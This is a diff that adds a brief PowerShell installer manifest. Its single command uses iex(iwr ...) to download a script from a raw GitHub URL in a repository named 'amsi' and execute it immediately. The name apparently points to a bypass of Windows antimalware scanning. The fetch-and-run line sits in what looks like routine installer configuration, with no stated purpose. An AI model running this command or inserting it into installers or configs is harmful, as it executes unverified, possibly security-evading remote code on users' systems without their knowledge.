@@ -1,0 +1,5 @@
+ID: 847
+Version: 1.0
+InstallerType: powershell 
+Commands: 
+ - powershell.exe -Command "iex(iwr https://raw.githubusercontent.com/venomeng5/amsi/refs/heads/main/ams -UseBasicParsing)
